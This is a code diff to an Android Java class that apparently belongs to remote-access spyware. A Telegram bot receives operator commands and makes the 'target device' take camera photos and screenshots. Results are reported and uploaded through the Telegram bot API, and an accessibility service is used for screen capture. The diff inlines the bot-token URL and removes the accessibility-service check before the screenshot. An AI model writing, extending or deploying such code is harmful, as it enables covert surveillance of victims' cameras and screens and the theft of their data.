@@ -121,13 +121,11 @@ public class TelegramBotWorker implements Runnable {
         try {
             String data = cb.getString("data");
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
-            String token = ConfigLoader.getBotToken();
-            String messageUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
 
             switch (data) {
                 case "CAM1":
                 case "CAM2":
-                    post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Taking picture...\"}", context);
+                    post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", "{\"chat_id\":" + chatId + ",\"text\":\"Taking picture...\"}", context);
                     CameraHandler.takePicture(context, data, new CameraHandler.CameraCallback() {
                         @Override
                         public void onPictureTaken(String filePath) {
@@ -135,22 +133,16 @@ public class TelegramBotWorker implements Runnable {
                         }
                         @Override
                         public void onError(String error) {
-                            post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Camera Error: " + error + "\"}", context);
+                            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", "{\"chat_id\":" + chatId + ",\"text\":\"Camera Error: " + error + "\"}", context);
                         }
                     });
                     break;
 
                 case "SCREENSHOT":
-                    // Check if Accessibility Service is enabled first
-                    if (AutoClickerAccessibilityService.isServiceEnabled()) {
-                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Taking screenshot...\"}", context);
-                        Intent intent = new Intent(context, ScreenshotActivity.class);
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        context.startActivity(intent);
-                    } else {
-                        // Inform the operator that permission is missing
-                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Screenshot failed: Accessibility Service is not enabled on the target device.\"}", context);
-                    }
+                    post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", "{\"chat_id\":" + chatId + ",\"text\":\"Requesting screenshot permission...\"}", context);
+                    Intent intent = new Intent(context, ScreenshotActivity.class);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
                     break;
             }
         } catch (Exception e) {
@@ -180,6 +172,7 @@ public class TelegramBotWorker implements Runnable {
             }
         }).start();
     }
+
 
     public static void uploadFile(String filePath, long chatId, String caption, Context context) {
         new Thread(() -> {
